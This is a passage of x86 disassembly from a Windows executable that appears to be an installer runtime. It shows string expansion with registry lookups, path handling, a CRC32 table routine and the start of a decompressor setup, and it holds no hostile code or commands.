  406545:	ff 74 24 0c          	push   0xc(%esp)
  406549:	ff 15 c0 80 40 00    	call   *0x4080c0
  40654f:	c2 08 00             	ret    $0x8
  406552:	ff 25 c4 80 40 00    	jmp    *0x4080c4
  406558:	ff 25 84 80 40 00    	jmp    *0x408084
  40655e:	33 c0                	xor    %eax,%eax
  406560:	50                   	push   %eax
  406561:	50                   	push   %eax
  406562:	ff 74 24 14          	push   0x14(%esp)
  406566:	ff 74 24 14          	push   0x14(%esp)
  40656a:	6a ff                	push   $0xffffffff
  40656c:	ff 74 24 18          	push   0x18(%esp)
  406570:	50                   	push   %eax
  406571:	50                   	push   %eax
  406572:	ff 15 bc 80 40 00    	call   *0x4080bc
  406578:	c3                   	ret
  406579:	55                   	push   %ebp
  40657a:	8b ec                	mov    %esp,%ebp
  40657c:	83 ec 18             	sub    $0x18,%esp
  40657f:	8b 45 0c             	mov    0xc(%ebp),%eax
  406582:	85 c0                	test   %eax,%eax
  406584:	7d 11                	jge    0x406597
  406586:	8b 0d 3c 92 42 00    	mov    0x42923c,%ecx
  40658c:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  406593:	2b c8                	sub    %eax,%ecx
  406595:	8b 01                	mov    (%ecx),%eax
  406597:	8b 0d b8 a2 42 00    	mov    0x42a2b8,%ecx
  40659d:	53                   	push   %ebx
  40659e:	56                   	push   %esi
  40659f:	57                   	push   %edi
  4065a0:	8d 14 41             	lea    (%ecx,%eax,2),%edx
  4065a3:	b8 00 82 42 00       	mov    $0x428200,%eax
  4065a8:	39 45 08             	cmp    %eax,0x8(%ebp)
  4065ab:	8b f0                	mov    %eax,%esi
  4065ad:	0f 82 12 02 00 00    	jb     0x4067c5
  4065b3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4065b6:	2b c8                	sub    %eax,%ecx
  4065b8:	d1 f9                	sar    $1,%ecx
  4065ba:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4065c0:	0f 83 ff 01 00 00    	jae    0x4067c5
  4065c6:	8b 75 08             	mov    0x8(%ebp),%esi
  4065c9:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  4065cd:	e9 f3 01 00 00       	jmp    0x4067c5
  4065d2:	8b ce                	mov    %esi,%ecx
  4065d4:	2b c8                	sub    %eax,%ecx
  4065d6:	83 e1 fe             	and    $0xfffffffe,%ecx
  4065d9:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4065df:	0f 8d ec 01 00 00    	jge    0x4067d1
  4065e5:	6a 02                	push   $0x2
  4065e7:	59                   	pop    %ecx
  4065e8:	03 d1                	add    %ecx,%edx
  4065ea:	66 83 ff 04          	cmp    $0x4,%di
  4065ee:	89 55 0c             	mov    %edx,0xc(%ebp)
  4065f1:	0f 83 bb 01 00 00    	jae    0x4067b2
  4065f7:	8a 4a 01             	mov    0x1(%edx),%cl
  4065fa:	8a 02                	mov    (%edx),%al
  4065fc:	8a d1                	mov    %cl,%dl
  4065fe:	8a d8                	mov    %al,%bl
  406600:	83 e2 7f             	and    $0x7f,%edx
  406603:	83 e3 7f             	and    $0x7f,%ebx
  406606:	c1 e2 07             	shl    $0x7,%edx
  406609:	0f b6 c0             	movzbl %al,%eax
  40660c:	0b d3                	or     %ebx,%edx
  40660e:	8b d8                	mov    %eax,%ebx
  406610:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406613:	ba 00 80 00 00       	mov    $0x8000,%edx
  406618:	0b da                	or     %edx,%ebx
  40661a:	83 45 0c 02          	addl   $0x2,0xc(%ebp)
  40661e:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  406621:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406624:	0f b6 d9             	movzbl %cl,%ebx
  406627:	8b cb                	mov    %ebx,%ecx
  406629:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40662c:	0b ca                	or     %edx,%ecx
  40662e:	66 83 ff 02          	cmp    $0x2,%di
  406632:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406635:	0f 85 1a 01 00 00    	jne    0x406755
  40663b:	8b 0d 6c a2 42 00    	mov    0x42a26c,%ecx
  406641:	6a 02                	push   $0x2
  406643:	85 c9                	test   %ecx,%ecx
  406645:	5f                   	pop    %edi
  406646:	79 17                	jns    0x40665f
  406648:	66 81 f9 04 5a       	cmp    $0x5a04,%cx
  40664d:	74 10                	je     0x40665f
  40664f:	83 fb 23             	cmp    $0x23,%ebx
  406652:	74 0b                	je     0x40665f
  406654:	83 fb 2e             	cmp    $0x2e,%ebx
  406657:	74 06                	je     0x40665f
  406659:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40665d:	eb 07                	jmp    0x406666
  40665f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  406666:	83 3d 04 a3 42 00 00 	cmpl   $0x0,0x42a304
  40666d:	74 03                	je     0x406672
  40666f:	6a 04                	push   $0x4
  406671:	5f                   	pop    %edi
  406672:	84 c0                	test   %al,%al
  406674:	79 39                	jns    0x4066af
  406676:	8b c8                	mov    %eax,%ecx
  406678:	83 e0 3f             	and    $0x3f,%eax
  40667b:	83 e1 40             	and    $0x40,%ecx
  40667e:	51                   	push   %ecx
  40667f:	8b 0d b8 a2 42 00    	mov    0x42a2b8,%ecx
  406685:	56                   	push   %esi
  406686:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  406689:	50                   	push   %eax
  40668a:	68 28 84 40 00       	push   $0x408428
  40668f:	68 02 00 00 80       	push   $0x80000002
  406694:	e8 71 fd ff ff       	call   0x40640a
  406699:	66 83 3e 00          	cmpw   $0x0,(%esi)
  40669d:	0f 85 9a 00 00 00    	jne    0x40673d
  4066a3:	53                   	push   %ebx
  4066a4:	56                   	push   %esi
  4066a5:	e8 cf fe ff ff       	call   0x406579
  4066aa:	e9 85 00 00 00       	jmp    0x406734
  4066af:	83 f8 25             	cmp    $0x25,%eax
  4066b2:	75 0e                	jne    0x4066c2
  4066b4:	68 00 04 00 00       	push   $0x400
  4066b9:	56                   	push   %esi
  4066ba:	ff 15 80 80 40 00    	call   *0x408080
  4066c0:	eb 72                	jmp    0x406734
  4066c2:	83 f8 24             	cmp    $0x24,%eax
  4066c5:	75 69                	jne    0x406730
  4066c7:	68 00 04 00 00       	push   $0x400
  4066cc:	56                   	push   %esi
  4066cd:	ff 15 d8 80 40 00    	call   *0x4080d8
  4066d3:	33 ff                	xor    %edi,%edi
  4066d5:	eb 59                	jmp    0x406730
  4066d7:	a1 64 a2 42 00       	mov    0x42a264,%eax
  4066dc:	33 c9                	xor    %ecx,%ecx
  4066de:	4f                   	dec    %edi
  4066df:	3b c1                	cmp    %ecx,%eax
  4066e1:	74 18                	je     0x4066fb
  4066e3:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  4066e6:	74 13                	je     0x4066fb
  4066e8:	56                   	push   %esi
  4066e9:	51                   	push   %ecx
  4066ea:	51                   	push   %ecx
  4066eb:	ff 74 bd e8          	push   -0x18(%ebp,%edi,4)
  4066ef:	ff 35 68 a2 42 00    	push   0x42a268
  4066f5:	ff d0                	call   *%eax
  4066f7:	85 c0                	test   %eax,%eax
  4066f9:	74 39                	je     0x406734
  4066fb:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4066fe:	50                   	push   %eax
  4066ff:	ff 74 bd e8          	push   -0x18(%ebp,%edi,4)
  406703:	ff 35 68 a2 42 00    	push   0x42a268
  406709:	ff 15 78 81 40 00    	call   *0x408178
  40670f:	85 c0                	test   %eax,%eax
  406711:	75 19                	jne    0x40672c
  406713:	56                   	push   %esi
  406714:	ff 75 f8             	push   -0x8(%ebp)
  406717:	ff 15 84 81 40 00    	call   *0x408184
  40671d:	ff 75 f8             	push   -0x8(%ebp)
  406720:	8b d8                	mov    %eax,%ebx
  406722:	ff 15 a8 82 40 00    	call   *0x4082a8
  406728:	85 db                	test   %ebx,%ebx
  40672a:	75 08                	jne    0x406734
  40672c:	66 83 26 00          	andw   $0x0,(%esi)
  406730:	85 ff                	test   %edi,%edi
  406732:	75 a3                	jne    0x4066d7
  406734:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406738:	74 13                	je     0x40674d
  40673a:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  40673d:	83 fb 1a             	cmp    $0x1a,%ebx
  406740:	75 0b                	jne    0x40674d
  406742:	68 80 84 40 00       	push   $0x408480
  406747:	56                   	push   %esi
  406748:	e8 0b fe ff ff       	call   0x406558
  40674d:	56                   	push   %esi
  40674e:	e8 98 00 00 00       	call   0x4067eb
  406753:	eb 4a                	jmp    0x40679f
  406755:	66 83 ff 03          	cmp    $0x3,%di
  406759:	75 31                	jne    0x40678c
  40675b:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40675e:	83 ff 1d             	cmp    $0x1d,%edi
  406761:	75 0e                	jne    0x406771
  406763:	ff 35 68 a2 42 00    	push   0x42a268
  406769:	56                   	push   %esi
  40676a:	e8 14 fd ff ff       	call   0x406483
  40676f:	eb 11                	jmp    0x406782
  406771:	8b c7                	mov    %edi,%eax
  406773:	c1 e0 0b             	shl    $0xb,%eax
  406776:	05 00 b0 42 00       	add    $0x42b000,%eax
  40677b:	50                   	push   %eax
  40677c:	56                   	push   %esi
  40677d:	e8 ba fd ff ff       	call   0x40653c
  406782:	83 c7 eb             	add    $0xffffffeb,%edi
  406785:	83 ff 07             	cmp    $0x7,%edi
  406788:	73 15                	jae    0x40679f
  40678a:	eb c1                	jmp    0x40674d
  40678c:	66 83 ff 01          	cmp    $0x1,%di
  406790:	75 0d                	jne    0x40679f
  406792:	83 c8 ff             	or     $0xffffffff,%eax
  406795:	2b 45 fc             	sub    -0x4(%ebp),%eax
  406798:	50                   	push   %eax
  406799:	56                   	push   %esi
  40679a:	e8 da fd ff ff       	call   0x406579
  40679f:	56                   	push   %esi
  4067a0:	e8 ad fd ff ff       	call   0x406552
  4067a5:	8b 55 0c             	mov    0xc(%ebp),%edx
  4067a8:	8d 34 46             	lea    (%esi,%eax,2),%esi
  4067ab:	b8 00 82 42 00       	mov    $0x428200,%eax
  4067b0:	eb 13                	jmp    0x4067c5
  4067b2:	75 0c                	jne    0x4067c0
  4067b4:	66 8b 3a             	mov    (%edx),%di
  4067b7:	66 89 3e             	mov    %di,(%esi)
  4067ba:	03 f1                	add    %ecx,%esi
  4067bc:	03 d1                	add    %ecx,%edx
  4067be:	eb 05                	jmp    0x4067c5
  4067c0:	66 89 3e             	mov    %di,(%esi)
  4067c3:	03 f1                	add    %ecx,%esi
  4067c5:	66 8b 3a             	mov    (%edx),%di
  4067c8:	66 85 ff             	test   %di,%di
  4067cb:	0f 85 01 fe ff ff    	jne    0x4065d2
  4067d1:	66 83 26 00          	andw   $0x0,(%esi)
  4067d5:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4067d9:	5f                   	pop    %edi
  4067da:	5e                   	pop    %esi
  4067db:	5b                   	pop    %ebx
  4067dc:	74 09                	je     0x4067e7
  4067de:	50                   	push   %eax
  4067df:	ff 75 08             	push   0x8(%ebp)
  4067e2:	e8 55 fd ff ff       	call   0x40653c
  4067e7:	c9                   	leave
  4067e8:	c2 08 00             	ret    $0x8
  4067eb:	55                   	push   %ebp
  4067ec:	56                   	push   %esi
  4067ed:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4067f1:	57                   	push   %edi
  4067f2:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  4067f6:	75 18                	jne    0x406810
  4067f8:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  4067fd:	75 11                	jne    0x406810
  4067ff:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  406804:	75 0a                	jne    0x406810
  406806:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  40680b:	75 03                	jne    0x406810
  40680d:	83 c6 08             	add    $0x8,%esi
  406810:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406814:	74 0d                	je     0x406823
  406816:	56                   	push   %esi
  406817:	e8 6c f6 ff ff       	call   0x405e88
  40681c:	85 c0                	test   %eax,%eax
  40681e:	74 03                	je     0x406823
  406820:	83 c6 04             	add    $0x4,%esi
  406823:	66 8b 06             	mov    (%esi),%ax
  406826:	8b ee                	mov    %esi,%ebp
  406828:	66 85 c0             	test   %ax,%ax
  40682b:	8b fe                	mov    %esi,%edi
  40682d:	74 40                	je     0x40686f
  40682f:	53                   	push   %ebx
  406830:	8b 1d 30 82 40 00    	mov    0x408230,%ebx
  406836:	66 3d 1f 00          	cmp    $0x1f,%ax
  40683a:	76 25                	jbe    0x406861
  40683c:	50                   	push   %eax
  40683d:	68 cc a5 40 00       	push   $0x40a5cc
  406842:	e8 f7 f5 ff ff       	call   0x405e3e
  406847:	66 83 38 00          	cmpw   $0x0,(%eax)
  40684b:	75 14                	jne    0x406861
  40684d:	56                   	push   %esi
  40684e:	ff d3                	call   *%ebx
  406850:	2b c6                	sub    %esi,%eax
  406852:	d1 f8                	sar    $1,%eax
  406854:	50                   	push   %eax
  406855:	56                   	push   %esi
  406856:	57                   	push   %edi
  406857:	e8 91 f7 ff ff       	call   0x405fed
  40685c:	57                   	push   %edi
  40685d:	ff d3                	call   *%ebx
  40685f:	8b f8                	mov    %eax,%edi
  406861:	56                   	push   %esi
  406862:	ff d3                	call   *%ebx
  406864:	8b f0                	mov    %eax,%esi
  406866:	66 8b 06             	mov    (%esi),%ax
  406869:	66 85 c0             	test   %ax,%ax
  40686c:	75 c8                	jne    0x406836
  40686e:	5b                   	pop    %ebx
  40686f:	66 83 27 00          	andw   $0x0,(%edi)
  406873:	57                   	push   %edi
  406874:	55                   	push   %ebp
  406875:	ff 15 b0 81 40 00    	call   *0x4081b0
  40687b:	8b f8                	mov    %eax,%edi
  40687d:	66 8b 07             	mov    (%edi),%ax
  406880:	66 3d 20 00          	cmp    $0x20,%ax
  406884:	74 06                	je     0x40688c
  406886:	66 3d 5c 00          	cmp    $0x5c,%ax
  40688a:	75 08                	jne    0x406894
  40688c:	66 83 27 00          	andw   $0x0,(%edi)
  406890:	3b ef                	cmp    %edi,%ebp
  406892:	72 df                	jb     0x406873
  406894:	5f                   	pop    %edi
  406895:	5e                   	pop    %esi
  406896:	5d                   	pop    %ebp
  406897:	c2 04 00             	ret    $0x4
  40689a:	56                   	push   %esi
  40689b:	be 98 67 42 00       	mov    $0x426798,%esi
  4068a0:	56                   	push   %esi
  4068a1:	ff 74 24 0c          	push   0xc(%esp)
  4068a5:	ff 15 6c 81 40 00    	call   *0x40816c
  4068ab:	83 f8 ff             	cmp    $0xffffffff,%eax
  4068ae:	74 0b                	je     0x4068bb
  4068b0:	50                   	push   %eax
  4068b1:	ff 15 64 81 40 00    	call   *0x408164
  4068b7:	8b c6                	mov    %esi,%eax
  4068b9:	eb 02                	jmp    0x4068bd
  4068bb:	33 c0                	xor    %eax,%eax
  4068bd:	5e                   	pop    %esi
  4068be:	c2 04 00             	ret    $0x4
  4068c1:	55                   	push   %ebp
  4068c2:	8b ec                	mov    %esp,%ebp
  4068c4:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  4068ca:	56                   	push   %esi
  4068cb:	be 04 01 00 00       	mov    $0x104,%esi
  4068d0:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  4068d6:	56                   	push   %esi
  4068d7:	50                   	push   %eax
  4068d8:	ff 15 80 80 40 00    	call   *0x408080
  4068de:	3b c6                	cmp    %esi,%eax
  4068e0:	5e                   	pop    %esi
  4068e1:	76 02                	jbe    0x4068e5
  4068e3:	33 c0                	xor    %eax,%eax
  4068e5:	85 c0                	test   %eax,%eax
  4068e7:	74 0f                	je     0x4068f8
  4068e9:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  4068f0:	ff 5c 
  4068f2:	74 04                	je     0x4068f8
  4068f4:	33 c9                	xor    %ecx,%ecx
  4068f6:	eb 03                	jmp    0x4068fb
  4068f8:	33 c9                	xor    %ecx,%ecx
  4068fa:	41                   	inc    %ecx
  4068fb:	ff 75 08             	push   0x8(%ebp)
  4068fe:	8d 0c 4d 14 a0 40 00 	lea    0x40a014(,%ecx,2),%ecx
  406905:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  40690c:	51                   	push   %ecx
  40690d:	68 e0 a5 40 00       	push   $0x40a5e0
  406912:	50                   	push   %eax
  406913:	ff 15 54 82 40 00    	call   *0x408254
  406919:	83 c4 10             	add    $0x10,%esp
  40691c:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406922:	6a 08                	push   $0x8
  406924:	6a 00                	push   $0x0
  406926:	50                   	push   %eax
  406927:	ff 15 40 81 40 00    	call   *0x408140
  40692d:	c9                   	leave
  40692e:	c2 04 00             	ret    $0x4
  406931:	8b 44 24 04          	mov    0x4(%esp),%eax
  406935:	56                   	push   %esi
  406936:	8b f0                	mov    %eax,%esi
  406938:	57                   	push   %edi
  406939:	c1 e6 03             	shl    $0x3,%esi
  40693c:	8b be 10 a4 40 00    	mov    0x40a410(%esi),%edi
  406942:	57                   	push   %edi
  406943:	ff 15 78 80 40 00    	call   *0x408078
  406949:	85 c0                	test   %eax,%eax
  40694b:	75 0a                	jne    0x406957
  40694d:	57                   	push   %edi
  40694e:	e8 6e ff ff ff       	call   0x4068c1
  406953:	85 c0                	test   %eax,%eax
  406955:	74 0f                	je     0x406966
  406957:	ff b6 14 a4 40 00    	push   0x40a414(%esi)
  40695d:	50                   	push   %eax
  40695e:	ff 15 7c 80 40 00    	call   *0x40807c
  406964:	eb 02                	jmp    0x406968
  406966:	33 c0                	xor    %eax,%eax
  406968:	5f                   	pop    %edi
  406969:	5e                   	pop    %esi
  40696a:	c2 04 00             	ret    $0x4
  40696d:	55                   	push   %ebp
  40696e:	8b ec                	mov    %esp,%ebp
  406970:	83 ec 1c             	sub    $0x1c,%esp
  406973:	56                   	push   %esi
  406974:	8b 75 08             	mov    0x8(%ebp),%esi
  406977:	57                   	push   %edi
  406978:	8b 3d 00 82 40 00    	mov    0x408200,%edi
  40697e:	eb 0a                	jmp    0x40698a
  406980:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406983:	50                   	push   %eax
  406984:	ff 15 a4 81 40 00    	call   *0x4081a4
  40698a:	6a 01                	push   $0x1
  40698c:	56                   	push   %esi
  40698d:	56                   	push   %esi
  40698e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406991:	6a 00                	push   $0x0
  406993:	50                   	push   %eax
  406994:	ff d7                	call   *%edi
  406996:	85 c0                	test   %eax,%eax
  406998:	75 e6                	jne    0x406980
  40699a:	5f                   	pop    %edi
  40699b:	5e                   	pop    %esi
  40699c:	c9                   	leave
  40699d:	c2 04 00             	ret    $0x4
  4069a0:	55                   	push   %ebp
  4069a1:	8b ec                	mov    %esp,%ebp
  4069a3:	81 ec 00 01 00 00    	sub    $0x100,%esp
  4069a9:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4069af:	68 00 01 00 00       	push   $0x100
  4069b4:	50                   	push   %eax
  4069b5:	ff 75 0c             	push   0xc(%ebp)
  4069b8:	e8 a1 fb ff ff       	call   0x40655e
  4069bd:	83 c4 0c             	add    $0xc,%esp
  4069c0:	85 c0                	test   %eax,%eax
  4069c2:	74 12                	je     0x4069d6
  4069c4:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4069ca:	50                   	push   %eax
  4069cb:	ff 75 08             	push   0x8(%ebp)
  4069ce:	ff 15 7c 80 40 00    	call   *0x40807c
  4069d4:	eb 02                	jmp    0x4069d8
  4069d6:	33 c0                	xor    %eax,%eax
  4069d8:	c9                   	leave
  4069d9:	c2 08 00             	ret    $0x8
  4069dc:	55                   	push   %ebp
  4069dd:	8b ec                	mov    %esp,%ebp
  4069df:	51                   	push   %ecx
  4069e0:	56                   	push   %esi
  4069e1:	8b 35 74 80 40 00    	mov    0x408074,%esi
  4069e7:	57                   	push   %edi
  4069e8:	6a 64                	push   $0x64
  4069ea:	ff 75 08             	push   0x8(%ebp)
  4069ed:	ff d6                	call   *%esi
  4069ef:	bf 02 01 00 00       	mov    $0x102,%edi
  4069f4:	eb 0e                	jmp    0x406a04
  4069f6:	6a 0f                	push   $0xf
  4069f8:	e8 70 ff ff ff       	call   0x40696d
  4069fd:	6a 64                	push   $0x64
  4069ff:	ff 75 08             	push   0x8(%ebp)
  406a02:	ff d6                	call   *%esi
  406a04:	3b c7                	cmp    %edi,%eax
  406a06:	74 ee                	je     0x4069f6
  406a08:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406a0b:	50                   	push   %eax
  406a0c:	ff 75 08             	push   0x8(%ebp)
  406a0f:	ff 15 70 80 40 00    	call   *0x408070
  406a15:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a18:	5f                   	pop    %edi
  406a19:	5e                   	pop    %esi
  406a1a:	c9                   	leave
  406a1b:	c2 04 00             	ret    $0x4
  406a1e:	83 3d ec 7d 42 00 00 	cmpl   $0x0,0x427dec
  406a25:	56                   	push   %esi
  406a26:	75 2d                	jne    0x406a55
  406a28:	33 c9                	xor    %ecx,%ecx
  406a2a:	6a 08                	push   $0x8
  406a2c:	8b c1                	mov    %ecx,%eax
  406a2e:	5e                   	pop    %esi
  406a2f:	8b d0                	mov    %eax,%edx
  406a31:	80 e2 01             	and    $0x1,%dl
  406a34:	f6 da                	neg    %dl
  406a36:	1b d2                	sbb    %edx,%edx
  406a38:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406a3e:	d1 e8                	shr    $1,%eax
  406a40:	33 c2                	xor    %edx,%eax
  406a42:	4e                   	dec    %esi
  406a43:	75 ea                	jne    0x406a2f
  406a45:	89 04 8d e8 7d 42 00 	mov    %eax,0x427de8(,%ecx,4)
  406a4c:	41                   	inc    %ecx
  406a4d:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406a53:	7c d5                	jl     0x406a2a
  406a55:	8b 54 24 10          	mov    0x10(%esp),%edx
  406a59:	8b 44 24 08          	mov    0x8(%esp),%eax
  406a5d:	85 d2                	test   %edx,%edx
  406a5f:	f7 d0                	not    %eax
  406a61:	76 23                	jbe    0x406a86
  406a63:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406a67:	57                   	push   %edi
  406a68:	0f b6 39             	movzbl (%ecx),%edi
  406a6b:	8b f0                	mov    %eax,%esi
  406a6d:	81 e6 ff 00 00 00    	and    $0xff,%esi
  406a73:	33 f7                	xor    %edi,%esi
  406a75:	c1 e8 08             	shr    $0x8,%eax
  406a78:	8b 34 b5 e8 7d 42 00 	mov    0x427de8(,%esi,4),%esi
  406a7f:	33 c6                	xor    %esi,%eax
  406a81:	41                   	inc    %ecx
  406a82:	4a                   	dec    %edx
  406a83:	75 e3                	jne    0x406a68
  406a85:	5f                   	pop    %edi
  406a86:	f7 d0                	not    %eax
  406a88:	5e                   	pop    %esi
  406a89:	c2 0c 00             	ret    $0xc
  406a8c:	b8 80 00 00 00       	mov    $0x80,%eax
  406a91:	48                   	dec    %eax
  406a92:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406a96:	75 f9                	jne    0x406a91
  406a98:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406a9c:	33 c0                	xor    %eax,%eax
  406a9e:	40                   	inc    %eax
  406a9f:	89 41 68             	mov    %eax,0x68(%ecx)
  406aa2:	89 41 64             	mov    %eax,0x64(%ecx)
  406aa5:	89 41 60             	mov    %eax,0x60(%ecx)
  406aa8:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406aab:	c3                   	ret
  406aac:	55                   	push   %ebp
  406aad:	8b ec                	mov    %esp,%ebp
  406aaf:	81 ec 90 00 00 00    	sub    $0x90,%esp
  406ab5:	53                   	push   %ebx
  406ab6:	56                   	push   %esi
  406ab7:	57                   	push   %edi
  406ab8:	6a 22                	push   $0x22
  406aba:	8b f1                	mov    %ecx,%esi
  406abc:	59                   	pop    %ecx
  406abd:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  406ac3:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  406ac9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406acb:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  406acf:	75 08                	jne    0x406ad9
  406ad1:	33 c0                	xor    %eax,%eax
  406ad3:	40                   	inc    %eax
  406ad4:	e9 20 0a 00 00       	jmp    0x4074f9
  406ad9:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406adc:	8b 75 ac             	mov    -0x54(%ebp),%esi
  406adf:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  406ae5:	83 f8 1c             	cmp    $0x1c,%eax
  406ae8:	0f 87 08 0a 00 00    	ja     0x4074f6
  406aee:	ff 24 85 fe 74 40 00 	jmp    *0x4074fe(,%eax,4)
  406af5:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406af9:	0f 84 e2 09 00 00    	je     0x4074e1
  406aff:	8b 45 90             	mov    -0x70(%ebp),%eax
  406b02:	ff 4d 94             	decl   -0x6c(%ebp)
  406b05:	ff 45 90             	incl   -0x70(%ebp)
  406b08:	8a 00                	mov    (%eax),%al
  406b0a:	3c e1                	cmp    $0xe1,%al
  406b0c:	0f 87 e4 09 00 00    	ja     0x4074f6
  406b12:	0f b6 c0             	movzbl %al,%eax
  406b15:	6a 2d                	push   $0x2d
  406b17:	99                   	cltd
  406b18:	59                   	pop    %ecx
  406b19:	f7 f9                	idiv   %ecx
  406b1b:	6a 09                	push   $0x9
  406b1d:	59                   	pop    %ecx
  406b1e:	8b f0                	mov    %eax,%esi
  406b20:	0f b6 c2             	movzbl %dl,%eax
  406b23:	99                   	cltd
  406b24:	f7 f9                	idiv   %ecx
  406b26:	8b ce                	mov    %esi,%ecx
  406b28:	0f b6 fa             	movzbl %dl,%edi
  406b2b:	33 d2                	xor    %edx,%edx
  406b2d:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  406b30:	42                   	inc    %edx
  406b31:	d3 e2                	shl    %cl,%edx
  406b33:	8b c8                	mov    %eax,%ecx
  406b35:	4a                   	dec    %edx
  406b36:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  406b39:	33 d2                	xor    %edx,%edx
  406b3b:	42                   	inc    %edx
  406b3c:	d3 e2                	shl    %cl,%edx
  406b3e:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  406b41:	be 00 03 00 00       	mov    $0x300,%esi
  406b46:	d3 e6                	shl    %cl,%esi
  406b48:	4a                   	dec    %edx
  406b49:	89 55 e8             	mov    %edx,-0x18(%ebp)
  406b4c:	81 c6 36 07 00 00    	add    $0x736,%esi
  406b52:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  406b55:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  406b58:	74 26                	je     0x406b80
  406b5a:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406b5e:	74 09                	je     0x406b69
  406b60:	ff 75 fc             	push   -0x4(%ebp)
  406b63:	ff 15 34 81 40 00    	call   *0x408134
  406b69:	57                   	push   %edi
  406b6a:	6a 40                	push   $0x40
  406b6c:	ff 15 38 81 40 00    	call   *0x408138
  406b72:	85 c0                	test   %eax,%eax
  406b74:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406b77:	0f 84 79 09 00 00    	je     0x4074f6
  406b7d:	89 7d 88             	mov    %edi,-0x78(%ebp)
  406b80:	85 f6                	test   %esi,%esi
  406b82:	74 0c                	je     0x406b90
  406b84:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b87:	4e                   	dec    %esi
  406b88:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  406b8e:	75 f4                	jne    0x406b84
  406b90:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  406b94:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406b98:	eb 26                	jmp    0x406bc0
  406b9a:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406b9e:	0f 84 a6 08 00 00    	je     0x40744a
  406ba4:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406ba7:	ff 4d 94             	decl   -0x6c(%ebp)
  406baa:	8b c8                	mov    %eax,%ecx
  406bac:	8b 45 90             	mov    -0x70(%ebp),%eax
  406baf:	c1 e1 03             	shl    $0x3,%ecx
  406bb2:	0f b6 00             	movzbl (%eax),%eax
  406bb5:	d3 e0                	shl    %cl,%eax
  406bb7:	09 45 c0             	or     %eax,-0x40(%ebp)
  406bba:	ff 45 90             	incl   -0x70(%ebp)
  406bbd:	ff 45 b8             	incl   -0x48(%ebp)
  406bc0:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  406bc4:	7c d4                	jl     0x406b9a
  406bc6:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406bc9:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406bcc:	74 28                	je     0x406bf6
  406bce:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406bd2:	89 45 8c             	mov    %eax,-0x74(%ebp)
  406bd5:	74 09                	je     0x406be0
  406bd7:	ff 75 f8             	push   -0x8(%ebp)
  406bda:	ff 15 34 81 40 00    	call   *0x408134
  406be0:	ff 75 c0             	push   -0x40(%ebp)
  406be3:	6a 40                	push   $0x40
  406be5:	ff 15 38 81 40 00    	call   *0x408138
  406beb:	85 c0                	test   %eax,%eax
  406bed:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406bf0:	0f 84 00 09 00 00    	je     0x4074f6
  406bf6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406bf9:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
